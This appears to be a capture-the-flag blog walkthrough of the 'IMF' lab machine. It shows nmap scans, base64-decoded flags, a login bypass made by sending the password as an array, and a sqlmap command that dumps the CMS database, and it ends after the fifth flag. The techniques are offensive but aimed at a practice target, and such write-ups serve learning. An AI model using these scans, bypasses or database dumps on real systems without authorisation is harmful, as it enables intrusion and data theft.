---
layout: post
title: imf
---

#IMF

##Finding machine on the network:

###Nmap
nmap -sn 192.168.1.0/24

Scan for hosts on my local network (192.168.1.1) which gave me a machine named "imf"

Now to run nmap on the machine itself:

nmap -Pn -oA imf-nmap-results -p 0-65525 192.168.1.21

Looks like port 80 is open.

After clicking through the pages on the site and viewing their sources I found this: 

<!-- flag1{YWxsdGhlZmlsZXM=} -->

The first flag, having a = at the end looks base64 encoded.

echo YWxsdGhlZmlsZXM= | base64 -d

returns: allthefiles

Something I noticed on the contact page was some random weird named js files:

<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
<script src="js/XUnRhVzVwYzNS.js"></script>
<script src="js/eVlYUnZjZz09fQ==.min.js"></script>

Those all might combine into a base64 string, lets check it out

echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -D

which  returns: flag2{aW1mYWRtaW5pc3RyYXRvcg==}

after running: echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -D

I get:

imfadministrator

I tried browsing to: http://192.168.1.21/imfadministrator

Loads up a login page, upon viewing the page source I find:

<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->


I remembered seeing emails on the contact page, went page and sure enough roger is a user, rmichaels is his email.

Trying the user it seems the user is valid.

After some googling, looks like there is a potential authentication type conversion that might get us around authentication.  Looking at a post changing the type of the data that is received server side could bypass authentication.  Intercepting the HTTP post with burp and changing pass to pass[], this ends up sending an array down to the server instead of a string, improper handling of the input must be how we can get past it.  Once the post is forwarded another flag: flag3{Y29udGludWVUT2Ntcw==} which decodes to: continueTOcms


sqlmap --url http://192.168.1.21/imfadministrator/cms.php?pagename=home --threads 5 --level 5 --cookie="PHPSESSID=phpsessionid" --dbms=MYSQL --dump

Important to remember the last two parameters, I missed these originally and totally didn't get some output for moving forward from the command line.

Another flag: flag4{dXBsb2Fkcjk0Mi5waHA=} which decodes to: uploadr942.php

flag5{YWdlbnRzZXJ2aWNlcw==} which decodes to: agentservices

